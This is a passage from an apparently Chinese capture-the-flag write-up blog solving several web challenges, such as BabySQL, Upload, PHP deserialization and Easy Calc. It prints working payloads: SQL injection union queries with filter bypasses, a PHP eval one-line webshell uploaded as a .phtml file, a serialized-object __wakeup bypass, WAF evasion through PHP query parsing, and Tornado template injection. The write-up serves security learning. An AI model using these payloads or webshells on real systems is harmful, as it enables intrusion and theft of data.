src="https://s2.loli.net/2022/12/29/QlZeKhOpdfqItB2.png" alt="image-20221229164053229"></p><p>修改 密码为万能密码：<code>&#39; or 1=1%23&#39;</code></p><p><img src="https://s2.loli.net/2022/12/29/pmHF2fCuV8sYMLR.png" alt="image-20221229164137711"></p><p>我们发现登录成功，并且有回显，接着我们查看表中字段数： <code>&#39; order by 3%23</code></p><p><img src="https://s2.loli.net/2022/12/29/2oihmXOAyb83Kj9.png" alt="image-20221229164310866"></p><p>发现共有三列，接着判断回显：</p><p><img src="https://s2.loli.net/2022/12/29/Ewty7alUgxfNW39.png" alt="image-20221229164352359"></p><p>第2、3列会回显，然后就使用联合查询查询：数据库、表、列、数据：</p><p>查询数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;+union+select+1,database(),3%23<br></code></pre></td></tr></table></figure><p>查询表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=database()%23<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/29/V1Q6XIiyhL8tBzv.png" alt="image-20221229164708813"></p><p>查询字段：</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;+union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name=&#x27;l0ve1ysq1&#x27;%23<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/29/xfiAzDyGZOtchVY.png" alt="image-20221229164852700"></p><p>查询password字段数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;+union+select+1,group_concat(password),3+from+l0ve1ysq1%23<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/29/Lupwj6okeTntV3r.png" alt="image-20221229165023583"></p><p>得到flag</p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p><img src="https://s2.loli.net/2022/12/29/8UHFrzuiySkY1Go.png" alt="image-20221229165209196"></p><p><strong>解法一:</strong></p><p>直接使用蚁剑连接找 flag</p><p><strong>解法二：</strong></p><p>使用命令执行：</p><img src="https://s2.loli.net/2022/12/29/kowHRzyY5OUhnxT.png" alt="image-20221229165308743" style="zoom:25%;" /><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>查看源代码：发现 <code>/Secret.php</code></p><p><img src="https://s2.loli.net/2022/12/29/8lrtZKVgLHbWMd1.png" alt="image-20221229165533227"></p><p>访问一下：</p><img src="https://s2.loli.net/2022/12/29/ihXBVYSaDudH9ZW.png" alt="image-20221229165611248" style="zoom:33%;" /><p>我们先使用bp抓包：</p><p>他说不来自这个网址，说明可能检查的是 <code>Referer</code> 头</p><p>我们加一下就行：</p><img src="https://s2.loli.net/2022/12/29/r4kXFzM8yIjveQw.png" alt="image-20221229165810598" style="zoom: 25%;" /><p>然后又说需要使用这个浏览器，可能检查的是 UA，我们也改一下：</p><img src="https://s2.loli.net/2022/12/29/ogVJACYR32sUulI.png" alt="image-20221229165916504" style="zoom: 25%;" /><p>然后又说，需要从本地阅读，可能是检查ip地址，我们尝试 <code>X-Forwarded-For</code> ：</p><img src="https://s2.loli.net/2022/12/29/2LJTZGqgXRH1eDl.png" alt="image-20221229170035759" style="zoom: 25%;" /><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>文件上传题目，我们先上传一张内容为aaa的png图片：</p><img src="https://s2.loli.net/2022/12/29/7nFDlwiYmEkvfZh.png" alt="image-20221229170624254" style="zoom: 25%;" /><p>发现上传不了，我们猜测可能是图片内容检测，于是我们加上GIF文件头：<code>GIF89a</code></p><img src="https://s2.loli.net/2022/12/29/4Q9m1wfBRLIdCzx.png" alt="image-20221229170736572" style="zoom:25%;" /><p>发现上传成功了，上传路径为： <code>/upload/</code></p><p>然后我们修改png图片内容为图片马：</p><p><img src="https://s2.loli.net/2022/12/29/5dsDkViCApKEGnf.png" alt="image-20221229171103822"></p><p>然后提示说，不能带有 <code>&lt;?</code>，但是我们知道 php的另一种格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/29/JyBafbtK41oxmCM.png" alt="image-20221229171223286"></p><p>上传成功！</p><p>但是png图片怎么执行脚本呢？不行的，我们可以尝试其他后缀 php php3 php5 phtml</p><p><img src="https://s2.loli.net/2022/12/29/M94aifwg31dEmDT.png" alt="image-20221229171556802"></p><p>发现phtml可以上传，然后我们访问 &#x2F;upload&#x2F;a.phtml:</p><p><img src="https://s2.loli.net/2022/12/29/p9gWDVOw1qr2bku.png" alt="image-20221229171823825"></p><p>发现可行，于是使用蚁剑连接得到flag</p><img src="https://s2.loli.net/2022/12/29/QNtWoTaGmYb93fS.png" alt="image-20221229171806213" style="zoom:33%;" /><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>上传一个文件然后抓包：</p><img src="https://s2.loli.net/2022/12/29/h5n7LbSwR6tTvGP.png" alt="image-20221229183554196" style="zoom:33%;" /><p>经过尝试，我们可以上传 <code>phtml</code> 后缀文件，内容写一句话木马，上传成功。</p><p>然后使用命令执行拿到flag：</p><img src="https://s2.loli.net/2022/12/29/Apkq1ZtTcnI8fzm.png" alt="image-20221229183811868" style="zoom:33%;" /><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>登录使用bp抓包，然后我们去判断闭合：</p><img src="https://s2.loli.net/2022/12/29/Bz8Y2UFnN7e3SMR.png" alt="image-20221229185129247" style="zoom: 25%;" /><p>使用单引号报错，说明可以使用单引号闭合。</p><p>然后我们去判断字段数：</p><img src="https://s2.loli.net/2022/12/29/N8kqJEOy1BsCjmc.png" alt="image-20221229185245198" style="zoom:25%;" /><p>报错提示 <code>der 3</code> 我们不是 <code>order by 3</code> 吗？怎么变这样了，我们猜测可能将这些关键字替换为空了，使用双写绕过：</p><img src="https://s2.loli.net/2022/12/29/EyYoT7nD9zkpWGg.png" alt="image-20221229185510246" style="zoom:25%;" /><p>判断出字段有三个，然后我们使用联合查询判断回显，发现很多关键字也被过滤了，需要双写绕过：</p><img src="https://s2.loli.net/2022/12/29/xyATbkjO854Jt97.png" alt="image-20221229185632772" style="zoom:33%;" /><p>判断出第2、3列回显，于是依次查询数据库、表、列、数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;+ununionion+seleselectct+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema=database()%23 <br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/29/LzmWxePuX8wZkvV.png" alt="image-20221229185928408" style="zoom: 25%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;+ununionion+seleselectct+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_name=&#x27;b4bsql&#x27;%23<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/29/VH2UkyOzcBFnYQE.png" alt="image-20221229185958150" style="zoom:25%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;+ununionion+seleselectct+1,group_concat(passwoorrd),3+frfromom+b4bsql%23<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/29/mk7HU9L5DEZoQAw.png" alt="image-20221229190008313" style="zoom:25%;" /><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img src="https://s2.loli.net/2022/12/29/boSxmLu7AhtUrFf.png" alt="image-20221229190303654"></p><p>根据提示，备份网站，所以我们访问 <code>/www.zip</code> 获得 网站源码：</p><p>然后审计 class.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br><br>            <br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现析构方法中，如果密码&#x3D;100&amp;用户名&#x3D;admin就会输出flag</p><p>我们在 index.php 中可以传参：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>意思就是需要我们传递一个序列化的对象。但是我们知道，<strong>反序列化之前会调用 __wakeup() 方法</strong>，这会导致admin&#x3D;guest，这样就不能输出flag了。</p><p>我们如何绕过 __wakeup() 方法呢？</p><img src="https://s2.loli.net/2022/12/29/tpcy6Bzr1DPOAme.png" alt="image-20221229192436640" style="zoom:33%;" /><p>由于当前 php 版本是 5.3.3 。存在 wakeup 漏洞：</p><blockquote><p>漏洞影响版本：</p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>漏洞产生原因：</p><p>如果存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行 </p></blockquote><p>于是我们可以构造序列化对象：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;100&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>());<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>注意：要将属性值改为大于真实属性个数</p><p><img src="https://s2.loli.net/2022/12/29/7K6QJqIgtGBWnHa.png" alt="image-20221229193457209"></p><p>然后我们传参发现，居然没有用！</p><p>仔细观察payload发现，属性的长度与真实长度好像对不上，于是去查阅资料得知：</p><blockquote><h4 id="PHP——serialize-序列化类变量public、protected、private的区别"><a href="#PHP——serialize-序列化类变量public、protected、private的区别" class="headerlink" title="PHP——serialize()序列化类变量public、protected、private的区别"></a>PHP——serialize()序列化类变量public、protected、private的区别</h4><p>public无标记，变量名不变，长度不变: s:2:”op”;i:2;<br><strong>protected</strong>在变量名前添加标记%00<code>*</code>%00，长度+3: s:5:”%00*%00op”;i:2;<br><strong>private</strong>在变量名前添加%00(classname)%00，长度+2+类名长度: s:17:”%00FileHandler_Z%00op”;i:2;</p></blockquote><p>所以我们需要在 变量名的  <code>类名前后都添加 \00</code> ，这样长度就对上了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://s2.loli.net/2022/12/29/P2ZYg7RmJxwf16N.png" alt="image-20221229194450227"></p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>我们经过尝试，发现备份文件 &#x2F;index.php.bak:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码审计知：我们需要get传参一个数字，并且 &#x3D;&#x3D; <code>123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3</code></p><p>由于php弱比较，所以 当数字与字符串进行判断时，字符串的数值相当于第一次出现字母前的数字，若没有数字，则字符串 &#x3D;&#x3D; 0</p><p>因此，我们传参 key&#x3D;123 即可</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>首先查看页面源代码，发现存在 &#x2F;calc.php</p><p>访问它，得到源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist </span>= [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-variable">$blacklist as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem </span>. <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>然后我们代码审计，发现使用了 eval() 函数，我们可以进行代码执行漏洞。</p><p>但是经过尝试，我们发现如果参数num中存在字母的话，就会禁止访问：</p><img src="https://s2.loli.net/2022/12/29/PYxmk8RnN5aqzKX.png" alt="image-20221229211115207" style="zoom:25%;" /><p>我之前一直以为，waf只在php代码中体现，但是这里的话，<strong>waf我们是看不到的</strong></p><p>我们假设waf不允许 num 参数中存在字母，我们可以在<strong>num前加一个空格</strong> ：<code> num</code></p><p>这样的话，利用 <strong>php字符串解析特性</strong> ,可能waf会将 变量名中的空白符给去除、或者变成下滑线_</p><p><img src="https://s2.loli.net/2022/12/29/Qo5mvP6BcuklrXw.png" alt="image-20221229211720616"></p><p>num前添加空格之后就可以输入字母了，此时我们使用scandir() 扫描根目录下的文件，但是引号’’和斜杠&#x2F;被过滤了。怎么办？此时我们可以考虑使用 chr() 函数，将 &#x2F; 的ascii码47 转换为 &#x2F; ，扫描到了flag的位置。</p><p>然后我们使用 <strong>file_get_contents()</strong> 函数读取文件内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">? num=<span class="hljs-number">1</span>;<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">47</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">102</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">49</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">103</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">103</span>)))<br></code></pre></td></tr></table></figure><p>使用 chr() 函数去拼接 <code>/f1agg</code></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105871192">php字符串解析特性</a></p><blockquote><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><p>&#x2F;news.php?%20news[id%00&#x3D;42”+AND+1&#x3D;0–</p><p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p><p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.删除空白符<br><br>2.将某些字符转换为下划线（包括空格）<br></code></pre></td></tr></table></figure></blockquote><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>首先进入 payFlag页面：</p><img src="https://s2.loli.net/2022/12/29/haimzSIXsY8oDGg.png" alt="image-20221229213727267" style="zoom: 25%;" /><p>发现了几个限制条件：</p><blockquote><p>You must be a student from CUIT!!!<br>You must be answer the correct password!!!  </p><p>Flag need your 100000000 money</p></blockquote><p>查看源代码发现：</p><img src="https://s2.loli.net/2022/12/29/pF29mZQcSkLV5qG.png" alt="image-20221229213835698" style="zoom: 33%;" /><p>我们可以post提交一个password，弱类型比较，我们传参：<code>404a</code></p><p>首先先用bp抓包：</p><p><img src="https://s2.loli.net/2022/12/29/WNGDpTi6bmC2LaJ.png" alt="image-20221229213951310"></p><p>发现urse&#x3D;0，我们修改为1时，发现我们满足了一个条件。</p><p>然后我们修改请求方式为post，并传参 404a,接着我们post传参money：<code>100000000</code></p><img src="https://s2.loli.net/2022/12/29/SPirloXYs2TDzn1.png" alt="image-20221229214203922" style="zoom:33%;" /><p>提示说数字长度太长，于是我们使用科学计数法：<code>1e9</code></p><img src="https://s2.loli.net/2022/12/29/9mhQr4IgTcBdMUf.png" alt="image-20221229214254650" style="zoom:33%;" /><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开网站发现有三个链接：</p><img src="https://s2.loli.net/2022/12/29/j5x7c1lVIBU69tN.png" alt="image-20221229214602936" style="zoom:33%;" /><img src="https://s2.loli.net/2022/12/29/34x1BUigXwRWM9s.png" alt="image-20221229214610279" style="zoom:33%;" /><img src="https://s2.loli.net/2022/12/29/hs25rWnRKUkNbIH.png" alt="image-20221229214623547" style="zoom:33%;" /><img src="https://s2.loli.net/2022/12/29/SxqDFgumJrTlhdk.png" alt="image-20221229214629885" style="zoom:33%;" /><p>不知道如何下手，然后注意到题目：<code>tornado</code> 这是一个python框架。</p><p>于是我们猜测，这可能是模板注入。</p><p>当我们将url后面的值修改时，会报错：</p><img src="https://s2.loli.net/2022/12/29/SfgA6xvkRVl827o.png" alt="image-20221229214842346" style="zoom:33%;" /><blockquote><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是<strong>handler.settings</strong>，handler  指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，</p></blockquote><p>于是我们在msg参数中传参 <code>&#123;&#123;handler.settings&#125;&#125;</code> 得到cookie_secret得值</p><p><img src="https://s2.loli.net/2022/12/29/TRQUxsW3dgoIcXH.png" alt="image-20221229215852856"></p><p>然后我们只需要将 <code>/fllllllllllllag</code> md5编码，与 cookie_secret连接在一起后再一次编码即可：</p><p><img src="https://s2.loli.net/2022/12/29/yYiaLPt4SMo1Agk.png" alt="image-20221229220006734"></p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><img src="https://s2.loli.net/2022/12/29/VJ5Mw8YrnOjd1lZ.png" alt="image-20221229223053411"></p><p>bp抓包，发现响应头中有hint：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from &#x27;admin&#x27; where password=md5($pass,true)<br></code></pre></td></tr></table></figure><p>我们传进来的参数被放到md5()函数中了，这时，我们想起了sql注入中的md5绕过。</p><p>选一个字符串，md5之后带有 <code>&#39; or</code> 等字符的就可以进行绕过。</p><p>当然必须<strong>md5()函数的第二个参数为true</strong>：</p><p>  <strong>md5(string,raw)</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。要计算的字符串。</td></tr><tr><td>raw</td><td>可选。     默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串</td></tr></tbody></table><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">content:</span> ffifdyop<br><span class="hljs-symbol">hex:</span> <span 